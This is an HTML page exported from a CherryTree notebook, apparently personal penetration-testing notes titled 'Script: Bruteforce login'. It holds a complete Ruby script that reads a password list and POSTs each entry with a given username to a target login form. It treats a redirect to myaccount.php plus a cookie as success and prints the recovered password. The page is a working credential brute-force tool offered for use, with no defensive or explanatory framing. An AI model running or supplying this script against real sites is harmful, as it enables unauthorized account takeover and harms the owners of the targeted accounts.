<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Script: Bruteforce login</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Script: Bruteforce login</h1><br/><br /><br /><br /><div class="codebox"><div class="codebox">require&nbsp;&#39;net/http&#39;<br /><br />#parameters&nbsp;provided&nbsp;by&nbsp;the&nbsp;user<br />Target&nbsp;=&nbsp;ARGV[0]<br />User&nbsp;=&nbsp;ARGV[1]<br />Password_file&nbsp;=&nbsp;ARGV[2]<br /><br />url&nbsp;=&nbsp;URI(Target)<br />params&nbsp;=&nbsp;{&quot;user&quot;=&gt;User}<br />#Net::HTTP.start&nbsp;opens&nbsp;the&nbsp;TCP&nbsp;stream&nbsp;connection.<br />#&nbsp;It&nbsp;create&nbsp;a&nbsp;unique&nbsp;TCP&nbsp;session&nbsp;to&nbsp;perform&nbsp;different&nbsp;requests&nbsp;with&nbsp;the&nbsp;target&nbsp;server<br />http&nbsp;=&nbsp;Net::HTTP.start(url.hostname)<br />req&nbsp;=&nbsp;Net::HTTP::Post.new(url.request_uri)<br /><br />#test&nbsp;passwords&nbsp;in&nbsp;the&nbsp;file&nbsp;&quot;Password_file&nbsp;=&nbsp;ARGV[2]&quot;&nbsp;with&nbsp;an&nbsp;unique&nbsp;user&nbsp;&quot;User&nbsp;=&nbsp;ARGV[1]&quot;<br />File.open(Password_file,&#39;r&#39;)&nbsp;do&nbsp;|file|	<br />	real_pwd&nbsp;=&nbsp;file.each&nbsp;do	|pwd|<br />		params[&#39;pass&#39;]=pwd.chop<br />		req.set_form_data(params)<br />		res&nbsp;=&nbsp;http.request(req)<br />		#when&nbsp;the&nbsp;right&nbsp;password&nbsp;is&nbsp;found,&nbsp;the&nbsp;script&nbsp;stops&nbsp;reading&nbsp;from&nbsp;the&nbsp;Password_file&nbsp;and<br />		break&nbsp;pwd&nbsp;if&nbsp;(res[&#39;location&#39;]==&#39;myaccount.php&#39;&nbsp;&amp;&amp;&nbsp;res[&#39;set-cookie&#39;])<br />	end<br />	#&nbsp;the&nbsp;password&nbsp;is&nbsp;printed&nbsp;to&nbsp;stdout.<br />	puts&nbsp;&quot;\nPassword&nbsp;for&nbsp;&#39;&quot;+User+&quot;&#39;&nbsp;is:&nbsp;&quot;+real_pwd&nbsp;if&nbsp;real_pwd.is_a?String<br />end<br /><br />http.finish<br /></div></div></div>
</body>
</html>
